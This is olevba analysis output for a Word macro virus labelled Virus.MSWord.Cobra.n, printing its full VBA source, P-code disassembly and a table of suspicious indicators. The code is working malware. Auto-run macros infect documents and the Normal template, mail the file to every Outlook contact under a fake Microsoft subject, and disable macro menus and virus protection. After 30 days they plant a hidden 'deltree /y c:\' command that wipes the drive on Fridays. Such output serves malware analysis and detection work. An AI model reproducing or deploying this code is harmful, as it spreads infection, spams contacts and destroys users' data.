olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.n
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.n - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AAX_10D.bas 
in file: Virus.MSWord.Cobra.n - OLE stream: 'Macros/VBA/AAX_10D'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'AAX Version 1.0D
'An intelligent member of Cobra Family

Sub InfectCobra()
On Error Resume Next
InfectedDoc = False
InfectedNor = False
For Each IDoc In ActiveDocument.VBProject.VBComponents
If IDoc.Name <> "AAX_10D" And IDoc.Name <> "ThisDocument" And IDoc.Name <> "Reference to Normal" Then
Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=IDoc.Name, _
Object:=wdOrganizerObjectProjectItems
End If
Next
For Each INor In NormalTemplate.VBProject.VBComponents
If INor.Name <> "AAX_10D" And INor.Name <> "ThisDocument" Then
Application.OrganizerDelete Source:=NormalTemplate.FullName, _
Name:=INor.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
For Each IDoc In ActiveDocument.VBProject.VBComponents
If IDoc.Name = "AAX_10D" Then InfectedDoc = True
Next
For Each INor In NormalTemplate.VBProject.VBComponents
If INor.Name = "AAX_10D" Then InfectedNor = True
Next
If InfectedDoc = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
Destination:=ActiveDocument.FullName, _
Name:="AAX_10D", _
Object:=wdOrganizerObjectProjectItems
End If
If InfectedNor = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=NormalTemplate.FullName, _
Name:="AAX_10D", _
Object:=wdOrganizerObjectProjectItems
End If
End Sub
Sub AutoOpen()
Call Prot
Call RegEdit
Call InfectCobra
Call SendEmail
Call CreateCobra
End Sub
Sub RegEdit()
If System.PrivateProfileString("", "HKEY_CURRENT_USER\software\microsoft\office\", "Cobra") <> "Cobra" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\software\microsoft\office\", "Cobra") = "Cobra"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Cobra.LRB"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "LRB/DHK/BD"
End If
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Cobra\", "Inf")
If Not IsDate(ID) Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Cobra\", "Inf") = Format(Date, "mm/dd/yy")
End If
End Sub
Sub CreateCobra()
On Error Resume Next
InfectedDoc = False
InfectedNor = False
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Cobra\", "Inf")
CD = Format(Date, "mm/dd/yyyy")
TD = DateValue(CD) - DateValue(ID)
If TD >= 30 Then
For Each IDoc In ActiveDocument.VBProject.VBComponents
If IDoc.Name = "Cobra" Then InfectedDoc = True
Next
For Each INor In NormalTemplate.VBProject.VBComponents
If INor.Name = "Cobra" Then InfectedNor = True
Next
If InfectedDoc = False Then
Set AddMod = ActiveDocument.VBProject.VBComponents.Add(1)
AddMod.Name = "Cobra"
LA = "Sub FileNew" + Chr(13) + _
"On error resume next" + Chr(13) + _
"if weekday(date)=6 then " + Chr(13) + _
"Shell +""deltree /y c:\"", vbHide " + Chr(13) + _
"End if" + Chr(13) + _
"End Sub"
ActiveDocument.VBProject.VBComponents("Cobra").CodeModule.AddFromString LA
End If
If InfectedNor = False Then
Set AddMod = NormalTemplate.VBProject.VBComponents.Add(1)
AddMod.Name = "Cobra"
LA = "Sub FileNew" + Chr(13) + _
"On error resume next" + Chr(13) + _
"if weekday(date)=6 then " + Chr(13) + _
"Shell +""deltree /y c:\"", vbHide " + Chr(13) + _
"End if" + Chr(13) + _
"End Sub"
NormalTemplate.VBProject.VBComponents("Cobra").CodeModule.AddFromString LA
End If
End If
End Sub
Sub AutoClose()
On Error Resume Next
Call Prot
Call RegEdit
Call InfectCobra
Call SendEmail
Call CreateCobra
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub FileOpen()
On Error Resume Next
Call Prot
Call RegEdit
Call InfectCobra
Call SendEmail
Call CreateCobra
Dialogs(wdDialogFileOpen).Show
End Sub
Sub FileClose()
On Error Resume Next
Call Prot
Call RegEdit
Call InfectCobra
Call SendEmail
Call CreateCobra
WordBasic.FileClose
End Sub
Sub Prot()
On Error Resume Next
CustomizationContext = NormalTemplate
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("Tools").Controls("Macro").Delete
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
CommandBars("View").Controls("Toolbars").Delete
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
Sub SendEmail()
On Error Resume Next
Dim udoC, dmnC, buosC
Set udoC = CreateObject("Outlook.Application")
Set dmnC = udoC.GetNameSpace("MAPI")
dmnC.Logon "profile", "password"
For lC = 1 To dmnC.AddressLists.Count
Set abC = dmnC.AddressLists(lC)
iC = 1
Set buosC = udoC.CreateItem(0)
For tC = 1 To abC.AddressEntries.Count
oC = abC.AddressEntries(iC)
buosC.Recipients.Add oC
iC = iC + 1
Next tC
buosC.Subject = "Important Message From Microsoft Via " _
& Application.UserName
buosC.Body = "Important documment;-"
buosC.Attachments.Add ActiveDocument.FullName
buosC.Send
oC = ""
Next lC
dmn.LogOff
End Sub
Sub FileExit()
On Error Resume Next
Call Prot
Call RegEdit
Call InfectCobra
Call SendEmail
Call CreateCobra
WordBasic.FileExit
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Cobra.n
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/AAX_10D - 9114 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0010 "AAX Version 1.0D"
' Line #1:
' 	QuoteRem 0x0000 0x0025 "An intelligent member of Cobra Family"
' Line #2:
' Line #3:
' 	FuncDefn (Sub InfectCobra())
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	LitVarSpecial (False)
' 	St InfectedDoc 
' Line #6:
' 	LitVarSpecial (False)
' 	St InfectedNor 
' Line #7:
' 	StartForVariable 
' 	Ld IDoc 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #8:
' 	Ld IDoc 
' 	MemLd New 
' 	LitStr 0x0007 "AAX_10D"
' 	Ne 
' 	Ld IDoc 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	Ld IDoc 
' 	MemLd New 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #9:
' 	LineCont 0x0004 0F 00 00 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld IDoc 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	StartForVariable 
' 	Next 
' Line #12:
' 	StartForVariable 
' 	Ld INor 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #13:
' 	Ld INor 
' 	MemLd New 
' 	LitStr 0x0007 "AAX_10D"
' 	Ne 
' 	Ld INor 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #14:
' 	LineCont 0x0004 09 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld INor 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	StartForVariable 
' 	Next 
' Line #17:
' 	StartForVariable 
' 	Ld IDoc 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #18:
' 	Ld IDoc 
' 	MemLd New 
' 	LitStr 0x0007 "AAX_10D"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St InfectedDoc 
' 	EndIf 
' Line #19:
' 	StartForVariable 
' 	Next 
' Line #20:
' 	StartForVariable 
' 	Ld INor 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #21:
' 	Ld INor 
' 	MemLd New 
' 	LitStr 0x0007 "AAX_10D"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St InfectedNor 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Next 
' Line #23:
' 	Ld InfectedDoc 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #24:
' 	LineCont 0x000C 09 00 00 00 0F 00 00 00 13 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "AAX_10D"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Ld InfectedNor 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #27:
' 	LineCont 0x000C 09 00 00 00 0F 00 00 00 13 00 00 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "AAX_10D"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Sub AutoOpen())
' Line #31:
' 	ArgsCall (Call) Prot 0x0000 
' Line #32:
' 	ArgsCall (Call) RegEdit 0x0000 
' Line #33:
' 	ArgsCall (Call) InfectCobra 0x0000 
' Line #34:
' 	ArgsCall (Call) SendEmail 0x0000 
' Line #35:
' 	ArgsCall (Call) CreateCobra 0x0000 
' Line #36:
' 	EndSub 
' Line #37:
' 	FuncDefn (Sub RegEdit())
' Line #38:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\software\microsoft\office\"
' 	LitStr 0x0005 "Cobra"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0005 "Cobra"
' 	Ne 
' 	IfBlock 
' Line #39:
' 	LitStr 0x0005 "Cobra"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\software\microsoft\office\"
' 	LitStr 0x0005 "Cobra"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #40:
' 	LitStr 0x0009 "Cobra.LRB"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #41:
' 	LitStr 0x000A "LRB/DHK/BD"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	LitStr 0x0000 ""
' 	LitStr 0x0022 "HKEY_LOCAL_MACHINE\Software\Cobra\"
' 	LitStr 0x0003 "Inf"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St ID 
' Line #44:
' 	Ld ID 
' 	ArgsLd IsDate 0x0001 
' 	Not 
' 	IfBlock 
' Line #45:
' 	Ld Date 
' 	LitStr 0x0008 "mm/dd/yy"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0000 ""
' 	LitStr 0x0022 "HKEY_LOCAL_MACHINE\Software\Cobra\"
' 	LitStr 0x0003 "Inf"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub CreateCobra())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	LitVarSpecial (False)
' 	St InfectedDoc 
' Line #51:
' 	LitVarSpecial (False)
' 	St InfectedNor 
' Line #52:
' 	LitStr 0x0000 ""
' 	LitStr 0x0022 "HKEY_LOCAL_MACHINE\Software\Cobra\"
' 	LitStr 0x0003 "Inf"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St ID 
' Line #53:
' 	Ld Date 
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	St CD 
' Line #54:
' 	Ld CD 
' 	ArgsLd DateValue 0x0001 
' 	Ld ID 
' 	ArgsLd DateValue 0x0001 
' 	Sub 
' 	St TD 
' Line #55:
' 	Ld TD 
' 	LitDI2 0x001E 
' 	Ge 
' 	IfBlock 
' Line #56:
' 	StartForVariable 
' 	Ld IDoc 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #57:
' 	Ld IDoc 
' 	MemLd New 
' 	LitStr 0x0005 "Cobra"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St InfectedDoc 
' 	EndIf 
' Line #58:
' 	StartForVariable 
' 	Next 
' Line #59:
' 	StartForVariable 
' 	Ld INor 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #60:
' 	Ld INor 
' 	MemLd New 
' 	LitStr 0x0005 "Cobra"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St InfectedNor 
' 	EndIf 
' Line #61:
' 	StartForVariable 
' 	Next 
' Line #62:
' 	Ld InfectedDoc 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #63:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	Set AddMod 
' Line #64:
' 	LitStr 0x0005 "Cobra"
' 	Ld AddMod 
' 	MemSt New 
' Line #65:
' 	LineCont 0x0014 09 00 00 00 10 00 00 00 17 00 00 00 1E 00 00 00 25 00 00 00
' 	LitStr 0x000B "Sub FileNew"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0014 "On error resume next"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0018 "if weekday(date)=6 then "
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0020 "Shell +"deltree /y c:\", vbHide "
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "End if"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	St LA 
' Line #66:
' 	Ld LA 
' 	LitStr 0x0005 "Cobra"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	Ld InfectedNor 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	Set AddMod 
' Line #70:
' 	LitStr 0x0005 "Cobra"
' 	Ld AddMod 
' 	MemSt New 
' Line #71:
' 	LineCont 0x0014 09 00 00 00 10 00 00 00 17 00 00 00 1E 00 00 00 25 00 00 00
' 	LitStr 0x000B "Sub FileNew"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0014 "On error resume next"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0018 "if weekday(date)=6 then "
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0020 "Shell +"deltree /y c:\", vbHide "
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "End if"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	St LA 
' Line #72:
' 	Ld LA 
' 	LitStr 0x0005 "Cobra"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	EndSub 
' Line #76:
' 	FuncDefn (Sub AutoClose())
' Line #77:
' 	OnError (Resume Next) 
' Line #78:
' 	ArgsCall (Call) Prot 0x0000 
' Line #79:
' 	ArgsCall (Call) RegEdit 0x0000 
' Line #80:
' 	ArgsCall (Call) InfectCobra 0x0000 
' Line #81:
' 	ArgsCall (Call) SendEmail 0x0000 
' Line #82:
' 	ArgsCall (Call) CreateCobra 0x0000 
' Line #83:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #84:
' 	EndSub 
' Line #85:
' 	FuncDefn (Sub FileOpen())
' Line #86:
' 	OnError (Resume Next) 
' Line #87:
' 	ArgsCall (Call) Prot 0x0000 
' Line #88:
' 	ArgsCall (Call) RegEdit 0x0000 
' Line #89:
' 	ArgsCall (Call) InfectCobra 0x0000 
' Line #90:
' 	ArgsCall (Call) SendEmail 0x0000 
' Line #91:
' 	ArgsCall (Call) CreateCobra 0x0000 
' Line #92:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #93:
' 	EndSub 
' Line #94:
' 	FuncDefn (Sub FileClose())
' Line #95:
' 	OnError (Resume Next) 
' Line #96:
' 	ArgsCall (Call) Prot 0x0000 
' Line #97:
' 	ArgsCall (Call) RegEdit 0x0000 
' Line #98:
' 	ArgsCall (Call) InfectCobra 0x0000 
' Line #99:
' 	ArgsCall (Call) SendEmail 0x0000 
' Line #100:
' 	ArgsCall (Call) CreateCobra 0x0000 
' Line #101:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #102:
' 	EndSub 
' Line #103:
' 	FuncDefn (Sub Prot())
' Line #104:
' 	OnError (Resume Next) 
' Line #105:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #106:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #107:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #108:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #109:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #110:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #111:
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #112:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #113:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #114:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #115:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #116:
' 	EndSub 
' Line #117:
' 	FuncDefn (Sub SendEmail())
' Line #118:
' 	OnError (Resume Next) 
' Line #119:
' 	Dim 
' 	VarDefn udoC
' 	VarDefn dmnC
' 	VarDefn buosC
' Line #120:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set udoC 
' Line #121:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld udoC 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set dmnC 
' Line #122:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld dmnC 
' 	ArgsMemCall Logon 0x0002 
' Line #123:
' 	StartForVariable 
' 	Ld lC 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld dmnC 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #124:
' 	SetStmt 
' 	Ld lC 
' 	Ld dmnC 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set abC 
' Line #125:
' 	LitDI2 0x0001 
' 	St iC 
' Line #126:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld udoC 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set buosC 
' Line #127:
' 	StartForVariable 
' 	Ld tC 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld abC 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #128:
' 	Ld iC 
' 	Ld abC 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St oC 
' Line #129:
' 	Ld oC 
' 	Ld buosC 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #130:
' 	Ld iC 
' 	LitDI2 0x0001 
' 	Add 
' 	St iC 
' Line #131:
' 	StartForVariable 
' 	Ld tC 
' 	EndForVariable 
' 	NextVar 
' Line #132:
' 	LineCont 0x0004 05 00 00 00
' 	LitStr 0x0025 "Important Message From Microsoft Via "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld buosC 
' 	MemSt Subject 
' Line #133:
' 	LitStr 0x0015 "Important documment;-"
' 	Ld buosC 
' 	MemSt Body 
' Line #134:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld buosC 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #135:
' 	Ld buosC 
' 	ArgsMemCall Send 0x0000 
' Line #136:
' 	LitStr 0x0000 ""
' 	St oC 
' Line #137:
' 	StartForVariable 
' 	Ld lC 
' 	EndForVariable 
' 	NextVar 
' Line #138:
' 	Ld dmn 
' 	ArgsMemCall LogOff 0x0000 
' Line #139:
' 	EndSub 
' Line #140:
' 	FuncDefn (Sub FileExit())
' Line #141:
' 	OnError (Resume Next) 
' Line #142:
' 	ArgsCall (Call) Prot 0x0000 
' Line #143:
' 	ArgsCall (Call) RegEdit 0x0000 
' Line #144:
' 	ArgsCall (Call) InfectCobra 0x0000 
' Line #145:
' 	ArgsCall (Call) SendEmail 0x0000 
' Line #146:
' 	ArgsCall (Call) CreateCobra 0x0000 
' Line #147:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #148:
' 	EndSub 
' Line #149:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

